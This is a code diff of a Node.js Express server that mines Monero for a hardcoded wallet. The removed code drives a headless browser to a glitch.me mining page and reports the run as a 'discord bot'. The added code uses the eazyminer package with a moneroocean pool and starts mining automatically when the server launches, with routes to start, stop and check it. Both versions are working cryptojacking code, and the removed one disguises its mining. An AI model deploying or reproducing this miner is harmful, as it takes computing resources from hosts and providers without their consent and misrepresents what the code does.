@@ -1,97 +1,41 @@
 const express = require('express');
-const puppeteer = require('puppeteer');
-const path = require('path');
-const fs = require('fs');
-const { promisify } = require('util');
+const Miner = require('eazyminer');
 
+// Initialize the Express app
 const app = express();
-const PORT = 4000;
+const port = 9806; // Port for the Express server
 
-// Define the path to the log file in the 'public' folder
-const logFilePath = path.join(__dirname, 'public', 'browser-logs.txt');
-
-// Ensure the 'public' folder exists
-if (!fs.existsSync(path.dirname(logFilePath))) {
-  fs.mkdirSync(path.dirname(logFilePath));
-}
-
-// Function to append data to the log file
-const appendToLogFile = promisify(fs.appendFile);
-
-app.get('/', (req, res) => {
-  res.send({ message: "Server running" });
+// Create a new miner instance
+const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
+        url: 'gulf.moneroocean.stream:10128', // optional pool URL,
+    }],
+    autoStart: false // optional delay
 });
 
-// Route to download the log file
-app.get('/download-logs', (req, res) => {
-  res.download(logFilePath, 'browser-logs.txt', (err) => {
-    if (err) {
-      console.error('Error downloading file:', err);
-      res.status(500).send('Error downloading file.');
-    }
-  });
+// Start the miner manually
+miner.start();
+
+// Define a route to start the miner
+app.get('/start-miner', (req, res) => {
+    miner.start();
+    res.send('Miner started');
 });
 
-app.listen(PORT, () => {
-  console.log(`Test server is running on http://localhost:${PORT}`);
+// Define a route to stop the miner
+app.get('/stop-miner', (req, res) => {
+    miner.stop();
+    res.send('Miner stopped');
 });
 
-// Function to simulate a delay
-function delay(time) {
-  return new Promise(resolve => { 
-    setTimeout(resolve, time);
-  });
-}
+// Define a route to check miner status
+app.get('/status', (req, res) => {
+    res.send(miner.isRunning() ? 'Miner is running' : 'Miner is stopped');
+});
 
-(async () => {
-  // Launch a new browser instance
-  const browser = await puppeteer.launch({ headless: true });
-
-  // Open a new page
-  const page = await browser.newPage();
-
-  // Add an event listener for console messages
-  page.on('console', async msg => {
-    const text = msg.text();
-    console.log('Browser console message:', text);
-    await appendToLogFile(logFilePath, text + '\n');
-  });
-
-  // Go to a webpage
-  await page.goto('https://mewing-resolute-cardboard.glitch.me/', {
-    waitUntil: "networkidle0",
-    timeout: 0
-  });
-
-  // Function to introduce a delay
-  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-  await delay(2000);
-
-  const inputSelector = '#AddrField';
-  const BOTID = '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc';
-
-  await page.type(inputSelector, BOTID);
-  await page.keyboard.press("Enter");
-  await delay(2000);
-
-  await page.click('#WebBtn');
-
-  // Start monitoring the H value
-  setInterval(async () => {
-    try {
-      const HValue = await page.$eval('#WebH', el => el.textContent);
-      console.log(`Hs: ${HValue}`);
-    } catch (error) {
-      console.error('Error fetching Hvalue:', error.message);
-    }
-  }, 5000);
-
-  const pageTitle = await page.title();
-  console.log(pageTitle);
-  console.log(`Started discord bot on server ${BOTID}`);
-
-  // Close the browser
-  // await browser.close();
-
-})();
+// Start the Express server
+app.listen(port, () => {
+    console.log(`Server is running on http://localhost:${port}`);
+});
